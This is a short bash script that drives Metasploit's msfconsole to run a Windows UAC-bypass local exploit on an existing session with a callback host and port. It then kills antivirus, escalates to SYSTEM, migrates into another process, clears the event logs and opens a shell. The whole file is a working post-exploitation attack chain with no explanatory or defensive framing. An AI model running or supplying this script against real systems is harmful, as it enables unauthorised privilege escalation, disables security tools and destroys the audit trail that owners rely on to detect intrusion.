#!/bin/bash
msfconsole -x "use exploit/windows/local/bypassuac;
set SESSION 1;
set TECHNIQUE EXE;
set EXITFUNC process;
set LHOST 192.168.0.6;
set LPORT 4444;
run;
run killav;
getsystem;
getuid;
migrate 4072;
clearev;
shell"
